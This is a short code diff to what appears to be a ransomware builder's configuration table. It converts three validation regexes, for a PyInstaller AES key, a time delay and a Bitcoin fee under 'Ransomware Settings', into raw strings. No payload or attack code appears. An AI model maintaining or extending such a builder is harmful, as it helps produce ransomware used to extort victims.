@@ -105,7 +105,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "label": "PyInstaller AES Key",
             "label_object_name": "PyinstallerAesKeyLabel",
             "input_object_name": "PyinstallerAesKeyTextCtrl",
-            "regex": re.compile("^([A-Za-z0-9]{16})?$"),
+            "regex": re.compile(r"^([A-Za-z0-9]{16})?$"),
             "example": "093AC769F6557577452E9DB2C74B984A",
             "input_requirement": "A 16 byte(character) string of alphanumeric characters",
             "validate": True,
@@ -151,7 +151,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
         "time_delay", {
             "label": "Time Delay (s)",
             "input_object_name": "TimeDelayTextCtrl",
-            "regex": re.compile("^\d*$"),
+            "regex": re.compile(r"^\d*$"),
             "config_area": "Ransomware Settings",
             "validate": True,
             "default": "0"
@@ -220,7 +220,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "label": "Bitcoin Fee",
             "label_object_name": "BitcoinFeeLabel",
             "input_object_name": "BitcoinFeeTextCtrl",
-            "regex": re.compile("^([0-9]+(\.[0-9+]+)?)?$"),
+            "regex": re.compile(r"^([0-9]+(\.[0-9+]+)?)?$"),
             "example": "0.0897",
             "input_requirement": "A valid integer or floating point number",
             "config_area": "Ransomware Settings",
